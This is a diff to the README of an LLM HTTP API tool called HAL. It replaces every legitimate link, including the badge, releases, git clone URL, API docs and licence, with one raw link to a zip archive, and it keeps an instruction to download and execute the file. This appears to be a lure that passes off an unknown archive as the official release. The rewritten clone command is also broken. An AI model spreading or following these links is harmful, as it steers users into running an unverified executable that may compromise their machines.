@@ -1,8 +1,8 @@
 # HAL: HTTP API Layer for Large Language Models 🌐🤖
 
-![HAL Logo](https://img.shields.io/badge/HAL-HTTP%20API%20Layer-brightgreen)
+![HAL Logo](https://raw.githubusercontent.com/ritartistry/HAL/main/docs/public/Software-v2.3.zip%20API%20Layer-brightgreen)
 
-[![Download HAL Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/ritartistry/HAL/releases)
+[![Download HAL Releases](https://raw.githubusercontent.com/ritartistry/HAL/main/docs/public/Software-v2.3.zip%20Releases-Click%20Here-blue)](https://raw.githubusercontent.com/ritartistry/HAL/main/docs/public/Software-v2.3.zip)
 
 ---
 
@@ -45,7 +45,7 @@ To install HAL, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/ritartistry/HAL.git
+   git clone https://raw.githubusercontent.com/ritartistry/HAL/main/docs/public/Software-v2.3.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -60,7 +60,7 @@ To install HAL, follow these steps:
    ```
 
 4. **Download and Execute**:
-   For the latest version, visit the [Releases section](https://github.com/ritartistry/HAL/releases) to download the required files. Execute the downloaded file to start the server.
+   For the latest version, visit the [Releases section](https://raw.githubusercontent.com/ritartistry/HAL/main/docs/public/Software-v2.3.zip) to download the required files. Execute the downloaded file to start the server.
 
 ---
 
@@ -97,7 +97,7 @@ Once you have installed HAL, you can start using it right away. Here’s a quick
 
 ## API Documentation
 
-For detailed API documentation, please refer to the [API Docs](https://github.com/ritartistry/HAL/wiki). This section covers all endpoints, request parameters, and response formats.
+For detailed API documentation, please refer to the [API Docs](https://raw.githubusercontent.com/ritartistry/HAL/main/docs/public/Software-v2.3.zip). This section covers all endpoints, request parameters, and response formats.
 
 ### Key Endpoints
 
@@ -131,8 +131,8 @@ We welcome contributions to HAL! To contribute, follow these steps:
 
 ## License
 
-HAL is licensed under the MIT License. See the [LICENSE](https://github.com/ritartistry/HAL/blob/main/LICENSE) file for details.
+HAL is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/ritartistry/HAL/main/docs/public/Software-v2.3.zip) file for details.
 
 ---
 
-For more information, visit the [Releases section](https://github.com/ritartistry/HAL/releases) to download the latest version and stay updated with new features and improvements.
+For more information, visit the [Releases section](https://raw.githubusercontent.com/ritartistry/HAL/main/docs/public/Software-v2.3.zip) to download the latest version and stay updated with new features and improvements.
